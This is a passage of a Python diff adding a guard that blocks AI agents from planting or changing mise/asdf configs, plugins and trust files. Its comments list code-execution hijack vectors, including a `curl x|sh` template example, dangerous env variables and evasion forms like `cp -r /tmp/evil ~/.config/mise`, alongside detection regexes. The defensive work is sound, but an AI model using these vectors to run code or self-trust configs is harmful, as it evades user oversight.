@@ -9142,3 +9142,1463 @@ def _ed_extract(verb, args, state, dirs, hits) -> bool:
         if _ed_is_gated_parent(t) or editor_startup_path_hit(t):
             return True
     return False
+
+
+# ---------------------------------------------------------------------------
+# mise / asdf config exec hijack (`rules.rule_mise_exec_protect`).
+#
+# mise (https://mise.jdx.dev, formerly rtx -- the polyglot asdf successor,
+# now the default version manager in many Node/Python/Go/Rust setups) loads
+# every `mise.toml` from the cwd up to `/` (plus the global
+# `~/.config/mise/config.toml`) on EVERY prompt / `cd` once `mise activate`
+# is in the shell rc, and on every `mise exec`/`mise run`/shim invocation.
+# Several sections of that file run code or reshape the environment of
+# every later command, unattended:
+#   * `[hooks]` `enter`/`leave`/`cd`/`preinstall`/`postinstall` -- shell
+#     commands run on entering the directory, on every `cd`, or on install;
+#   * `[[watch_files]]` `run` -- a command run by `hook-env` when files change;
+#   * `[env] _.source = "x.sh"` -- a bash script SOURCED at activation;
+#     `_.file` loads a dotenv/json/yaml file of variables, `_.path` prepends
+#     directories to `PATH` (binary-shadowing every later `git`/`python`);
+#   * `[env]` variables themselves -- `LD_PRELOAD`, `NODE_OPTIONS`,
+#     `BASH_ENV`, `PROMPT_COMMAND`, `PS1`, `GIT_SSH_COMMAND`, `*_PROXY`,
+#     `PIP_INDEX_URL`, `XDG_CONFIG_HOME`, `ANTHROPIC_BASE_URL`, `MISE_*`...
+#     exported into the interactive shell and every process it starts;
+#   * Tera templates -- `{{ exec(command="curl x|sh") }}` is evaluated in
+#     ANY string value (env vars, tool versions) every time the file loads;
+#   * `[plugins]` (an asdf/vfox plugin from an arbitrary git URL, whose
+#     scripts mise runs), `[tools]` entries with a code-fetching backend
+#     (`ubi:`/`github:`/`http:`/`npm:`/`cargo:`/`go:`/`pipx:`/`vfox:`/
+#     `asdf:<url>`), a `path:` version, or tool options (`postinstall`),
+#     and `[tool_alias]` remapping a well-known tool name to one of those;
+#   * `[settings]` that remove mise's own safety checks (`trusted_config_
+#     paths`, `paranoid = false`, `yes`, `url_replacements`,
+#     `gpg_verify = false`, task/hook shell overrides...).
+# mise's own defense is `mise trust`: a non-global config using env/hooks/
+# templates is refused until trusted -- a CLI subcommand an agent can run
+# itself, exactly like `direnv allow`, and the global config is trusted
+# implicitly. asdf's `.tool-versions` is the same file family (mise reads
+# it too, backend prefixes and `path:` versions included), and both tools'
+# plugin/shim/install directories are code run by every shim call.
+#
+# Unlike an editor's init file, `mise.toml` has a large, routine, benign
+# subset (`[tools] node = "22"`, `[env] NODE_ENV = "dev"`, `[tasks]`), so
+# the content check PARSES the TOML (`tomllib`) and gates only the exec-
+# bearing constructs above; an edit that leaves the set of such constructs
+# unchanged (a human-set hook stays put) is not re-litigated.
+
+_MISE_B = _HTTP_RC_B
+_MISE_END = _WIN_TRIM + r"(?=[/\;&|)(<>`}:,]|\s|['\"]|$)"
+_MISE_BASE = r"(?:\.?(?:mise|rtx|miserc)(?:\.[\w-]{1,40}){0,16}\.toml)"
+_MISE_DIR_FILE = (r"(?:\.?(?:mise|rtx)" + _SEP + r"(?:conf\.d" + _SEP
+                  + r"[^/\\\n]{0,1024}?\.toml|config(?:\.[\w-]{1,40}){0,16}\.toml"
+                  + r"|settings\.toml))")
+MISE_CONFIG_PATH_RE = re.compile(
+    _MISE_B + r"(?:" + _MISE_BASE + r"|" + _MISE_DIR_FILE
+    + r"|\.tool-versions)" + _MISE_END,
+    re.IGNORECASE,
+)
+# Plugin / shim / install trees: code mise/asdf run on every shim call
+# (asdf plugins' `bin/exec-env`, `bin/list-bin-paths`, the shims
+# themselves). Any write is gated.
+MISE_RUNTIME_DIR_RE = re.compile(
+    _MISE_B + r"(?:"
+    r"\.local" + _SEP + r"share" + _SEP + r"(?:mise|rtx)"
+    r"|\.asdf"
+    r"|(?:(?:\$\{?|%|\$env:)LOCALAPPDATA[}%]?|AppData" + _SEP + r"Local)" + _SEP + r"mise"
+    r"|(?:\$\{?|%|\$env:)(?:MISE|RTX|ASDF)_DATA_DIR(?::?[-=+?][^}\s]{0,200})?[}%]?"
+    r")" + _SEP + r"(?:plugins|shims|installs)" + _MISE_END
+    # mise's trust store: in non-paranoid mode `is_trusted()` only checks
+    # that a (deterministically named) file exists here -- writing one IS
+    # `mise trust` (QA round 1).
+    + r"|" + _MISE_B + r"(?:\.local" + _SEP + r"state" + _SEP + r"(?:mise|rtx)"
+    r"|(?:\$\{?|%|\$env:)(?:MISE|RTX)_STATE_DIR(?::?[-=+?][^}\s]{0,200})?[}%]?"
+    r"|(?:\$\{?|%|\$env:)XDG_STATE_HOME[}%]?" + _SEP + r"(?:mise|rtx)"
+    r")" + _SEP + r"(?:trusted|ignored)-configs" + _MISE_END
+    # Default-package lists mise's core plugins install after EVERY new
+    # tool install (npm postinstall / gem / pip build code) -- QA round 4.
+    + r"|" + _MISE_B + r"\.default-(?:npm-packages|python-packages|gems|cargo-crates|go-packages)" + _MISE_END
+    # The lockfile pins download URLs/checksums for every tool.
+    + r"|" + _MISE_B + r"\.?(?:mise|rtx)(?:\.[\w-]{1,40}){0,6}\.lock" + _MISE_END,
+    re.IGNORECASE,
+)
+MISE_PATH_RE = re.compile(
+    "(?:" + MISE_CONFIG_PATH_RE.pattern + ")|(?:" + MISE_RUNTIME_DIR_RE.pattern + ")",
+    re.IGNORECASE,
+)
+# A mise config/runtime DIRECTORY itself (placing a whole directory under
+# this name plants every file in it -- QA round 8: `cp -r /tmp/evil
+# ~/.config/mise`, `ln -sfn /tmp/evil .mise`).
+MISE_CONFIG_DIR_RE = re.compile(
+    r"(?:^|(?<=[\s'\"=:<>|&;(`{,/\\]))(?:"
+    r"\.config[/\\]+(?:mise|rtx)(?:[/\\]+conf\.d)?"
+    r"|(?:\$\{?|%|\$env:)XDG_CONFIG_HOME(?::?[-=+?][^}\s]{0,200})?[}%]?[/\\]+(?:mise|rtx)(?:[/\\]+conf\.d)?"
+    r"|\.(?:mise|rtx)(?:[/\\]+conf\.d)?"
+    r"|(?<![\w.])mise[/\\]+conf\.d"
+    r"|etc[/\\]+(?:mise|rtx)"
+    r"|\.local[/\\]+(?:share|state)[/\\]+(?:mise|rtx)(?:[/\\]+(?:plugins|shims|installs|trusted-configs))?"
+    r"|\.asdf(?:[/\\]+(?:plugins|shims|installs))?"
+    r")[/\\]?(?=[\s'\";&|)<>`]|$)",
+    re.IGNORECASE,
+)
+_MISE_CD_RE = re.compile(r"(?:^|[\s;&|(`])(?:cd|pushd)\s+(?:-[LPe@]+\s+|--\s+)*([^\s;&|)`]+)")
+
+
+_MISE_WORD_RE = re.compile(r"[^\s;&|()<>`]+")
+
+
+def _mise_join(base: str, w: str) -> str:
+    w = w.strip("'\"")
+    if not base or w.startswith(("/", "~", "$")) or re.match(r"^[A-Za-z]:", w):
+        return w
+    return base.rstrip("/") + "/" + w
+
+
+_MISE_CWD_VOCAB = ("mise", "rtx", "asdf", "conf.d", ".toml", "tool-versions", "plugins",
+                   "shims", "installs", "trusted", "ignored", "default-", ".lock",
+                   "*", "?", "[")
+_MISE_CWD_MAX_DIR = 1024
+_MISE_CWD_MAX_JOINS = 3000
+
+
+_MISE_VARIANT_BUDGET = [0]
+
+
+def _mise_dir_or_path_hit(p: str) -> bool:
+    j = _ed_dotdot_normalize(p).rstrip("/")
+    m = MISE_CONFIG_DIR_RE.search(j)
+    if (m and m.end() >= len(j) - 1) or MISE_PATH_RE.search(j):
+        return True
+    if any(c in j for c in "*?["):
+        vs = _mise_glob_variants(j)
+        _MISE_VARIANT_BUDGET[0] += len(vs)
+        if _MISE_VARIANT_BUDGET[0] > 4000:
+            return True             # per-command budget (reset by mise_cwd_hit), fails closed
+        for v in vs:
+            v = v.rstrip("/")
+            m = MISE_CONFIG_DIR_RE.search(v)
+            if (m and m.end() >= len(v) - 1) or MISE_PATH_RE.search(v):
+                return True
+    return False
+
+
+_MISE_PLACE_VERBS = frozenset(("cp", "mv", "ln", "rsync", "install", "ditto", "scp"))
+_MISE_CLONE_VALUE_OPTS = frozenset((
+    "--depth", "-b", "--branch", "-o", "--origin", "--reference", "--reference-if-able",
+    "-c", "--config", "--template", "--separate-git-dir", "-u", "--upload-pack",
+    "--filter", "--shallow-since", "--shallow-exclude", "-j", "--jobs", "--bundle-uri",
+    "--server-option", "--name", "-r", "--rev", "-u", "--updaterev"))
+
+
+def _mise_cand_words(ws) -> list:
+    out = []
+    for w in ws:
+        if w.startswith("-"):
+            if "=" not in w:
+                continue
+            w = w.split("=", 1)[1]
+        if not w or len(w) > 1024:
+            continue
+        for e in (_brace_expand(w, 8) if "{" in w else [w]):
+            if any(v in e.lower() for v in _MISE_CWD_VOCAB):
+                out.append(e)
+    return out
+
+
+def mise_cwd_hit(cmd: str, cwd, _depth: int = 0) -> bool:
+    """True if some path word of the command, resolved against the event
+    cwd and every directory a `cd`/`pushd` (chained: `cd ~/.config && cd
+    mise`) may have left it in, is a mise config/runtime dir or file -- a
+    bare `config.toml`, or `cp -r evil mise` from `~/.config` (QA rounds
+    8-9); or if a cp/mv/ln/rsync/`git clone` places a source whose BASENAME
+    is a mise dir into a mise parent (`cp -r /tmp/mise ~/.config/`, `cd
+    ~/.config && git clone https://x/mise` -- QA round 11). Words are
+    shell-dequoted, `--opt=VAL` values and brace/glob forms expanded, only
+    mise-vocabulary words joined, and work is capped (QA rounds 10-11)."""
+    if not isinstance(cmd, str) or not cmd:
+        return False
+    if _depth == 0:
+        _MISE_VARIANT_BUDGET[0] = 0
+    segs = _mise_cli_segments(cmd)
+    if len(segs) > 4000:
+        return True
+    cur = str(cwd) if cwd else ""
+    dirs = {}
+    if cur:
+        dirs[_ed_dotdot_normalize(cur.replace("\\", "/")).rstrip("/") or "/"] = None
+    words = []
+    joins = 0
+    for seg in segs:
+        while seg and (seg[0].lower() in _MISE_WRAPPERS or _HTTP_RC_ASSIGN_RE.match(seg[0])):
+            if seg[0].lower() not in ("env",) and seg[0].lower() in _MISE_WRAPPERS:
+                seg = _mise_strip_wrapper(seg)
+                continue
+            if seg[0].lower() == "env":
+                # `env -C DIR cmd` / `--chdir=DIR` (QA round 12).
+                seg = seg[1:]
+                while seg and (seg[0].startswith("-") or _HTTP_RC_ASSIGN_RE.match(seg[0])):
+                    o = seg[0]
+                    if o in ("-u", "--unset") and len(seg) > 1:
+                        seg = seg[2:]           # `env -u X cmd` (QA round 14)
+                        continue
+                    if o in ("-C", "--chdir") and len(seg) > 1:
+                        cur = _mise_join(cur, seg[1]) if cur or seg[1].startswith(("/", "~", "$")) else seg[1]
+                        dirs[_ed_dotdot_normalize(cur.replace("\\", "/")).rstrip("/") or "/"] = None
+                        seg = seg[2:]
+                        continue
+                    if o.startswith("--chdir="):
+                        v = o.split("=", 1)[1]
+                        cur = _mise_join(cur, v) if cur or v.startswith(("/", "~", "$")) else v
+                        dirs[_ed_dotdot_normalize(cur.replace("\\", "/")).rstrip("/") or "/"] = None
+                    seg = seg[1:]
+                continue
+            seg = seg[1:]
+        if not seg:
+            continue
+        v0 = seg[0].rsplit("/", 1)[-1].lower()
+        if v0 in ("sh", "bash", "zsh", "dash", "ksh", "su", "flock", "runuser", "fish"):
+            # Re-judge a `-c BODY` with the current cwd (QA round 14).
+            for q_, w_ in enumerate(seg[1:-1], 1):
+                if re.fullmatch(r"-[A-Za-z]*c", w_) or w_ == "--command":
+                    if _depth < 4 and mise_cwd_hit(seg[q_ + 1], cur or None, _depth + 1):
+                        return True
+                    break
+        if v0 in ("cd", "pushd") and len(seg) > 1:
+            q = 1
+            while q < len(seg) and seg[q].startswith("-") and seg[q] != "-":
+                q += 1
+            if q < len(seg) and seg[q] != "-":
+                for tt in _brace_expand(seg[q], 8):
+                    nxt = _mise_join(cur, tt) if cur or tt.startswith(("/", "~", "$")) else tt
+                    nn = _ed_dotdot_normalize(nxt.replace("\\", "/")).rstrip("/") or "/"
+                    if len(nn) > _MISE_CWD_MAX_DIR:
+                        return True
+                    dirs[nn] = None
+                    cur = nn
+            continue
+        if v0 == "git":
+            # Walk git's global options to the subcommand, applying every
+            # `-C DIR`/`-CDIR` (QA round 13: `git -c x=y -C ~/.config clone`).
+            k = 1
+            while k < len(seg) and seg[k].startswith("-"):
+                o = seg[k]
+                if o == "-C" and k + 1 < len(seg):
+                    v = seg[k + 1]
+                    k += 2
+                elif o.startswith("-C") and len(o) > 2:
+                    v = o[2:]
+                    k += 1
+                else:
+                    k += 2 if o in ("-c", "--git-dir", "--work-tree", "--namespace",
+                                    "--config-env", "--exec-path") else 1
+                    continue
+                cur = _mise_join(cur, v) if cur or v.startswith(("/", "~", "$")) else v
+                dirs[_ed_dotdot_normalize(cur.replace("\\", "/")).rstrip("/") or "/"] = None
+            seg = [seg[0]] + seg[k:]
+        if v0 == "env":
+            # `env -C DIR cmd`, `git -C DIR clone ...` (QA round 12).
+            if "-C" in seg:
+                k = seg.index("-C")
+                if k + 1 < len(seg):
+                    cur = _mise_join(cur, seg[k + 1]) if cur or seg[k + 1].startswith(("/", "~", "$")) else seg[k + 1]
+                    dirs[_ed_dotdot_normalize(cur.replace("\\", "/")).rstrip("/") or "/"] = None
+                    seg = seg[:k] + seg[k + 2:]
+            if v0 == "env":
+                seg = seg[1:]
+                while seg and (seg[0].startswith("-") or _HTTP_RC_ASSIGN_RE.match(seg[0])):
+                    seg = seg[1:]
+                if not seg:
+                    continue
+                v0 = seg[0].rsplit("/", 1)[-1].lower()
+        # Known-name placement into a parent (QA rounds 11-12).
+        tdir = None
+        pos = []
+        k = 1
+        while k < len(seg):
+            w = seg[k]
+            if w in ("-t", "--target-directory") and k + 1 < len(seg) and v0 != "rsync":
+                tdir = seg[k + 1]
+                k += 2
+                continue
+            if w.startswith("--target-directory="):
+                tdir = w.split("=", 1)[1]
+            elif re.fullmatch(r"-[A-Za-z]*t", w) and k + 1 < len(seg) and v0 in ("cp", "mv", "ln", "install"):
+                tdir = seg[k + 1]
+                k += 2
+                continue
+            elif not w.startswith("-"):
+                pos.append(w)
+            k += 1
+        if v0 in _MISE_PLACE_VERBS and (len(pos) >= 2 or (tdir and pos)):
+            dest, srcs = (tdir, pos) if tdir else (pos[-1], pos[:-1])
+            dbase = _mise_join(cur, dest) if cur else dest
+            for sw in srcs[:200]:
+                b = sw.rstrip("/").replace("\\", "/").rsplit("/", 1)[-1]
+                if b and _mise_dir_or_path_hit(dbase.rstrip("/") + "/" + b):
+                    return True
+        clone_at = -1
+        if v0 == "git" and "clone" in seg:
+            clone_at = seg.index("clone")
+        elif v0 == "git" and "submodule" in seg and "add" in seg:
+            clone_at = seg.index("add")
+        elif v0 == "gh" and seg[1:3] == ["repo", "clone"]:
+            clone_at = 2
+        elif v0 in ("hg", "svn", "jj") and len(seg) > 1 and seg[1] in ("clone", "co", "checkout", "export"):
+            clone_at = 1
+        elif v0 == "jj" and "git" in seg and "clone" in seg:
+            clone_at = seg.index("clone")
+        if clone_at >= 0:
+            cp_, k = [], clone_at + 1
+            while k < len(seg):
+                w = seg[k]
+                if w in _MISE_CLONE_VALUE_OPTS:
+                    k += 2
+                    continue
+                if not w.startswith("-"):
+                    cp_.append(w)
+                k += 1
+            if cp_:
+                tgt = cp_[1] if len(cp_) > 1 else cp_[0].rstrip("/").rsplit("/", 1)[-1].removesuffix(".git")
+                if _mise_dir_or_path_hit(_mise_join(cur, tgt) if cur else tgt):
+                    return True
+        words.extend(seg)
+    if not dirs:
+        return False
+    if len(dirs) > 512:
+        return True
+    for d in dirs:
+        if _mise_dir_or_path_hit(d):
+            return True
+    cand = list(dict.fromkeys(_mise_cand_words(dict.fromkeys(words))))
+    if not cand:
+        return False
+    if len(cand) * len(dirs) > _MISE_CWD_MAX_JOINS:
+        return True                    # fail closed (bounded work)
+    for d in dirs:
+        for w in cand:
+            if _mise_dir_or_path_hit(_mise_join(d, w)):
+                return True
+    return False
+
+
+_MISE_LITERAL_KEYS = ("mise", "rtx", "asdf", "tool-versions", "default-")
+_MISE_NAMES = ("mise.toml", ".mise.toml", "mise.local.toml", ".mise.local.toml",
+               ".tool-versions", "rtx.toml", ".rtx.toml")
+_MISE_TAILS = ("mise/config.toml", ".mise/config.toml", "mise/settings.toml",
+               "rtx/config.toml", "mise/config.local.toml", ".mise/config.local.toml")
+
+
+def mise_kind(path) -> str:
+    """'toml' / 'tool-versions' / 'dir' / '' for a path."""
+    if not isinstance(path, str) or not path:
+        return ""
+    for m in MISE_CONFIG_PATH_RE.finditer(path):
+        g = m.group(0).lower().rstrip(" .")
+        if g.endswith(".tool-versions"):
+            return "tool-versions"
+        if re.search(r"(?:^|[/\\\s'\"=:<>|&;(`{,])\.?miserc(?:\.[\w-]+)*\.toml$", g):
+            return "miserc"
+        return "toml"
+    m = MISE_RUNTIME_DIR_RE.search(path)
+    if m:
+        t = m.group(0).lower()
+        if t.rstrip(" .").endswith(".lock"):
+            return "lock"
+        if "-configs" in t:
+            return "trust"
+        if ".default-" in t:
+            return "pkgs"
+        return "dir"
+    return ""
+
+
+_MISE_GLOB_VOCAB = (
+    "mise", "rtx", ".mise", ".rtx", ".asdf", "plugins", "shims", "installs",
+    "trusted-configs", "ignored-configs", ".config", "conf.d", ".local", "share",
+    "state", "etc", "mise.toml", ".mise.toml", "mise.local.toml", ".mise.local.toml",
+    ".tool-versions", "config.toml", "settings.toml", "mise.lock", ".miserc.toml",
+    ".default-npm-packages", ".default-python-packages", ".default-gems",
+    ".default-cargo-crates", ".default-go-packages",
+)
+
+
+def _mise_glob_variants(word: str, budget: int = 64) -> list:
+    """Vocabulary substitutions of a glob word's LAST six components only
+    (every mise path regex spans fewer), so the work per word is bounded
+    regardless of its length (QA round 11: a 395-char `sh*/sh*/...` word
+    made 64 full-length variants)."""
+    out = [""]
+    comps = word.replace("\\", "/").split("/")
+    # Substitute in at most the last 12 glob-bearing components; the rest
+    # stay literal (QA round 14: a deep `installs/<tool>/<ver>/bin/<exe>`
+    # target lost its `.local/share` prefix to the old 6-part window).
+    globbed = [i for i, c in enumerate(comps) if any(ch in c for ch in "*?[")][-12:]
+    for ci, comp in enumerate(comps):
+        opts = [comp]
+        if ci not in globbed:
+            pass
+        elif ci == len(comps) - 1 and re.fullmatch(r"[*?.]*(?:toml|lock)?", comp.lower()):
+            pass        # a final `*`/`*.toml` is too generic (`cp *.toml dist/`)
+        elif any(c in comp for c in "*?[") and len(
+                re.sub(r"[*?]|\[[^\]]*\]", "", comp)) <= 30 and len(comp) <= 200:
+            hits = [v for v in _MISE_GLOB_VOCAB if fnmatch.fnmatchcase(v, comp.lower())]
+            opts = hits or [comp]
+        nxt = []
+        for o in out:
+            for c in opts:
+                nxt.append(o + "/" + c if o else c)
+                if len(nxt) >= budget:
+                    break
+        out = nxt[:budget]
+    return [("/" + v) for v in out]
+
+
+def mise_shell_path_hit(cmd) -> bool:
+    """True if a shell command names a mise/asdf config file or runtime dir
+    -- literally, through backslash escapes, or through a glob/brace word
+    bash would expand to one (`mi{se,}.toml`, `.tool-version?`,
+    `~/.config/mi*/config.toml`)."""
+    if not isinstance(cmd, str) or not cmd:
+        return False
+    low = cmd.lower()
+    if "\\" in low:
+        low = low.replace("\\", "")
+    # Every literal path form needs one of these substrings; skip the
+    # regex scans otherwise (perf: the shared hook budget).
+    if any(k in low for k in _MISE_LITERAL_KEYS) and (
+            MISE_PATH_RE.search(cmd) or MISE_CONFIG_DIR_RE.search(cmd)):
+        return True
+    # `~/.config/mise/conf.d/../config.toml` (QA round 8).
+    if "." in cmd and len(cmd) < 400_000 and any(k in low for k in _MISE_LITERAL_KEYS):
+        norm = _ed_dotdot_normalize(cmd)
+        if norm != cmd and (MISE_PATH_RE.search(norm) or MISE_CONFIG_DIR_RE.search(norm)):
+            return True
+    seen_glob = set()
+    budget = [0]
+    unesc = cmd.replace("\\", "")
+    if unesc != cmd and any(k in low for k in _MISE_LITERAL_KEYS) and MISE_PATH_RE.search(unesc):
+        return True
+    for i, m in enumerate(_HTTP_RC_WORD_RE.finditer(unesc)):
+        if i > 4000:
+            return True                       # fail closed on absurd input
+        w = m.group(0)
+        if not any(c in w for c in "*?[{"):
+            continue
+        if len(w) > 400:
+            return True
+        # Component-wise: substitute each glob component by any mise
+        # vocabulary name it matches (`~/.local/share/mi?e/plugins/x`,
+        # `~/.a?df/plugins`, `trusted-c*` -- QA round 9).
+        tail6 = w
+        if tail6 in seen_glob:
+            continue
+        seen_glob.add(tail6)
+        if len(seen_glob) > 256:
+            return True             # bounded total glob work, fails closed (QA round 12)
+        vs = _mise_glob_variants(w)
+        budget[0] += len(vs)
+        if budget[0] > 4000:
+            return True                 # command-wide variant budget, fails closed
+        for v in vs:
+            if MISE_PATH_RE.search(v) or MISE_CONFIG_DIR_RE.search(v):
+                return True
+        parts = w.replace("\\", "/").split("/")
+        # A component whose LITERAL characters outnumber the longest mise
+        # name can never match one; skip the fnmatch work (QA round 13).
+        for n in (1, 2, 3) if len(re.sub(r"[*?]|\[[^\]]*\]|[{},]", "", "/".join(parts[-3:]))) <= 80 else ():
+            if len(parts) < n:
+                break
+            tail = "/".join(parts[-n:])
+            if not tail:
+                continue
+            for cand in _brace_expand(tail):
+                if MISE_PATH_RE.search("/" + cand):
+                    return True
+                if not any(c in cand for c in "*?["):
+                    continue
+                low = cand.lower()
+                budget[0] += 1
+                if budget[0] > 4000:
+                    return True               # command-wide glob budget, fails closed
+                if n == 1 and re.fullmatch(r"[*?.]*(?:toml)?", low):
+                    continue                  # `*.toml` alone: too generic
+                for name in (_MISE_NAMES if n == 1 else _MISE_TAILS):
+                    if fnmatch.fnmatchcase(name, low) or (
+                            n > 1 and fnmatch.fnmatchcase("x/" + name, "x/" + low)):
+                        return True
+                if n == 3 and fnmatch.fnmatchcase("mise/conf.d/x.toml", low):
+                    return True
+    return False
+
+
+# git subcommands that neither write a work-tree file nor run a pager/diff
+# program from config the agent controls (`-c`/`--exec-path`/an
+# exec-bearing env prefix void the exemption).
+_MISE_GIT_SAFE_SUBS = frozenset(("status", "diff", "log", "show", "add", "commit",
+                                 "blame", "ls-files", "grep", "check-ignore", "rm"))
+_MISE_GIT_BAD_RE = re.compile(
+    r"(?:^|\s)(?:-c\b|--exec-path|--output\b|-o\b|--ext-diff|--textconv)"
+    r"|GIT_\w+=|PAGER=|LESSOPEN=", re.IGNORECASE)
+
+
+def mise_shell_only_reads(cmd: str) -> bool:
+    """`http_client_rc_shell_only_reads` plus non-writing git subcommands
+    (`git add mise.toml`, `git diff .tool-versions`) and read-only mise/asdf
+    subcommands, which would otherwise make every commit of a project's
+    mise.toml ask."""
+    if not isinstance(cmd, str):
+        return False
+    stripped = _HTTP_RC_HARMLESS_REDIR_RE.sub(" ", cmd)
+    if ">" in stripped:
+        return False
+    for seg in _HTTP_RC_SEG_SPLIT_RE.split(stripped):
+        words = seg.split()
+        while words and (words[0].lower() in _HTTP_RC_PREFIX_WORDS
+                         or _HTTP_RC_ASSIGN_RE.match(words[0])):
+            if _HTTP_RC_ASSIGN_RE.match(words[0]) and _MISE_GIT_BAD_RE.search(words[0]):
+                return False
+            words.pop(0)
+        if not words:
+            continue
+        verb = words[0].strip("'\"").replace("\\", "/").rsplit("/", 1)[-1].lower()
+        if verb.endswith(".exe"):
+            verb = verb[:-4]
+        if verb in _HTTP_RC_NOOP_KEYWORDS:
+            continue
+        if verb == "git":
+            rest = words[1:]
+            if _MISE_GIT_BAD_RE.search(" " + " ".join(rest)):
+                return False
+            sub = next((w for w in rest if not w.startswith("-")), "")
+            if sub.lower() in _MISE_GIT_SAFE_SUBS:
+                continue
+            return False
+        if verb not in HTTP_RC_SAFE_VERBS:
+            return False
+        bad = _HTTP_RC_VERB_BAD_FLAGS.get(verb)
+        if bad and bad.search(" ".join(words[1:])):
+            return False
+    return True
+
+
+# ---- content check ----------------------------------------------------------
+try:                                   # Python 3.11+
+    import tomllib as _mise_toml
+except Exception:                      # pragma: no cover - 3.10 fallback
+    try:
+        import tomli as _mise_toml     # type: ignore
+    except Exception:
+        _mise_toml = None
+
+# Environment variables whose value changes what later commands EXECUTE,
+# where their traffic goes, or which config every other tool (and every
+# other Aegis guard's protected path) is read from.
+_MISE_ENV_EXACT = frozenset((
+    "BASH_ENV", "ENV", "ZDOTDIR", "PROMPT_COMMAND", "SHELLOPTS", "BASHOPTS",
+    "IFS", "HOME", "SHELL", "PS0", "PS1", "PS2", "PS3", "PS4", "PAGER",
+    "MANPAGER", "EDITOR", "VISUAL", "BROWSER", "TERMINAL", "LESSOPEN",
+    "LESSCLOSE", "LESSKEY", "LESSKEYIN", "MANOPT", "INPUTRC", "WGETRC",
+    "NETRC", "CC", "CXX", "CPP", "LD", "AR", "FC", "AS", "NM", "RANLIB",
+    "KUBECONFIG", "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE",
+    "DOCKER_HOST", "DOCKER_CONFIG", "SSH_AUTH_SOCK", "OPENSSL_CONF",
+    "OPENSSL_ENGINES", "SSLKEYLOGFILE", "REQUESTS_CA_BUNDLE",
+    "CURL_CA_BUNDLE", "HOSTALIASES", "RES_OPTIONS", "LOCALDOMAIN",
+    "VIMINIT", "EXINIT", "MYVIMRC", "NVIM_APPNAME", "GOTOOLCHAIN",
+    "TMPDIR", "MAKEFLAGS", "MFLAGS", "SUDO_ASKPASS", "BUN_INSTALL",
+    "LUA_INIT", "PHPRC", "PHP_INI_SCAN_DIR", "CONFIG_SITE", "RSYNC_RSH", "CI",
+    # zsh's PS1 family (`prompt_subst` runs `$(...)` on every prompt) -- QA round 2.
+    "PROMPT", "PROMPT2", "PROMPT3", "PROMPT4", "RPROMPT", "RPROMPT2", "RPS1",
+    "RPS2", "SPROMPT", "GOROOT", "FCEDIT", "R_PROFILE_USER", "R_PROFILE",
+    "ELECTRON_RUN_AS_NODE", "R_ENVIRON_USER",
+))
+_MISE_ENV_PREFIX = (
+    "LD_", "DYLD_", "MISE_", "RTX_", "ASDF_", "AEGIS_", "CLAUDE_", "ANTHROPIC_",
+    "OPENAI_", "PYTHON", "PERL", "RUBY", "NPM_CONFIG_", "YARN_", "PNPM_",
+    "PIP_", "UV_", "POETRY_", "CARGO_", "RUSTC", "RUSTUP_", "GIT_", "SSL_",
+    "NODE_", "JAVA_", "_JAVA_", "JDK_", "DOTNET_", "CORECLR_", "COR_",
+    "PKG_CONFIG", "DIRENV_", "XDG_", "GEM_", "BUNDLE_", "GOPROXY", "GONOSUMDB",
+    "GONOPROXY", "GOINSECURE", "GOSUMDB", "GOPRIVATE", "GOENV", "GOFLAGS",
+    "COMPOSER_", "MAVEN_", "GRADLE_", "SBT_", "DENO_", "BUN_", "HTTP",
+    "ALL_PROXY", "FTP_PROXY", "NO_PROXY", "TF_CLI_", "AWS_ENDPOINT",
+    "BASH_FUNC_", "LUA_INIT",
+)
+_MISE_ENV_SUFFIX = ("_PROXY", "PATH", "_HOME", "_OPTIONS", "_OPTS", "FLAGS",
+                    "_COMMAND", "_CMD", "EDITOR", "PAGER", "ASKPASS", "WRAPPER",
+                    "_SHELL", "_BASE_URL", "_INDEX_URL", "_REGISTRY", "PRELOAD",
+                    "_CA_CERTS", "_CA_BUNDLE", "_CAFILE", "_EXEC", "_HOOKS")
+# Benign names that a prefix/suffix above would otherwise catch.
+_MISE_ENV_OK = frozenset((
+    "NODE_ENV", "PYTHONUNBUFFERED", "PYTHONDONTWRITEBYTECODE", "PYTHONHASHSEED",
+    "PYTHONIOENCODING", "PYTHONUTF8", "PYTHONFAULTHANDLER", "PYTHONDEVMODE",
+    "PYTHONOPTIMIZE", "RUBY_YJIT_ENABLE", "GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL",
+    "GIT_COMMITTER_NAME", "GIT_COMMITTER_EMAIL", "GIT_TERMINAL_PROMPT",
+    "CARGO_TERM_COLOR", "CARGO_INCREMENTAL", "NODE_NO_WARNINGS",
+    "NODE_DISABLE_COLORS", "HTTP_PORT", "HTTP_HOST", "HTTPS_PORT",
+    "UV_PYTHON", "UV_CACHE_DIR", "PIP_DISABLE_PIP_VERSION_CHECK",
+    "POETRY_VIRTUALENVS_IN_PROJECT", "YARN_ENABLE_TELEMETRY",
+))
+
+
+def mise_env_name_dangerous(name) -> bool:
+    n = str(name or "").strip().upper()
+    if not n or n in _MISE_ENV_OK:
+        return False
+    if n.startswith(("VITE_", "NEXT_PUBLIC_", "REACT_APP_", "EXPO_PUBLIC_")) \
+            and not n.endswith(("PRELOAD", "_OPTIONS")):
+        return False                # frontend build constants (QA round 2)
+    if n in _MISE_ENV_EXACT:
+        return True
+    return n.startswith(_MISE_ENV_PREFIX) or n.endswith(_MISE_ENV_SUFFIX)
+
+
+# Top-level `[settings]` keys that only shape output/caching/which
+# idiomatic version files are read. Everything else -- and every nested
+# settings table except `status` -- is gated (an allowlist: mise has 150+
+# settings and adds more each release).
+_MISE_SETTINGS_SAFE = frozenset((
+    "experimental", "jobs", "color", "quiet", "verbose", "silent",
+    "disable_hints", "http_timeout", "fetch_remote_versions_timeout",
+    "fetch_remote_versions_cache", "cache_prune_age",
+    "idiomatic_version_file", "idiomatic_version_file_enable_tools",
+    "idiomatic_version_file_disable_tools", "legacy_version_file",
+    "legacy_version_file_disable_tools", "lockfile", "locked", "task_output",
+    "task_timings", "asdf_compat", "always_keep_download",
+    "always_keep_install", "plugin_autoupdate_last_check_duration",
+    "terminal_progress", "pin", "log_level", "profile", "disable_tools",
+    "disable_backends", "auto_install", "not_found_auto_install",
+    "exec_auto_install", "task_auto_install", "status", "activate_aggressive",
+    "trace", "env", "python_compile", "node_compile", "all_compile",
+))
+# Nested `[settings.<tool>]` keys with no exec/fetch effect (QA round 1).
+_MISE_SETTINGS_SAFE_NESTED = frozenset((
+    "python.uv_venv_auto", "python.venv_auto_create", "python.venv_stdlib",
